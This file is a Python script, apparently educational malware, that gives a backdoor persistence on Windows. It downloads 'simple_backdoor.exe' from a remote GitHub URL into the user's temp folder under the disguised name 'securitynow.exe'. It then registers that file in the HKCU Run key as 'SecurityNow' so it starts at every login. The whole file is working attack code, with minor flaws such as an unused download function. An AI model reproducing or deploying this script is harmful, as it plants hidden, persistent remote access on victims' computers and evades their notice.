#!/usr/bin/env python3
from winreg import (
  ConnectRegistry,
  OpenKey,
  SetValueEx,
  EnumValue,
  ExpandEnvironmentStrings,
  KEY_ALL_ACCESS,
  REG_EXPAND_SZ,
  HKEY_CURRENT_USER,
)

from ctypes import (
  windll,
  c_long,
  byref
)

from urllib3 import PoolManager

def flush_registry_changes():
  HWND_BROADCAST = 0xFFFF
  WM_SETTINGCHANGE = 0x1A
  SMTO_ABORTIFHUNG = 0x0002
  result = c_long()
  SendMessageTimeoutW = windll.user32.SendMessageTimeoutW
  SendMessageTimeoutW (
    HWND_BROADCAST, WM_SETTINGCHANGE, 0,
    u"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    SMTO_ABORTIFHUNG, 5000, byref(result)
  )

def create_backdoor_exe_file():
  user_temp_folder = ExpandEnvironmentStrings("%TEMP%")
  with open(f"{user_temp_folder}\\securitynow.exe", "w") as f:
    http = PoolManager()
    file_download = http.request (
      "GET",
      "https://github.com/binexisHATT/EthicalHacking/PyMalware/PersistenveViaWindowsRegistry/simple_backdoor.exe"
    )
    f.write(file_download.data)
    
def create_backdoor_key(path_to_startup_registry_key:str):
  with ConnectRegistry(None, HKEY_CURRENT_USER) as hkcu:
    with \
      OpenKey(hkcu, path_to_startup_registry_key, 0, KEY_ALL_ACCESS) \
    as startup_key:
      SetValueEx(startup_key, "SecurityNow", 0, REG_EXPAND_SZ, "%TEMP%\\securitynow.exe")
  flush_registry_changes()
        
if __name__ == "__main__":
  target_startup_registry_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  create_backdoor_key(target_startup_registry_key)
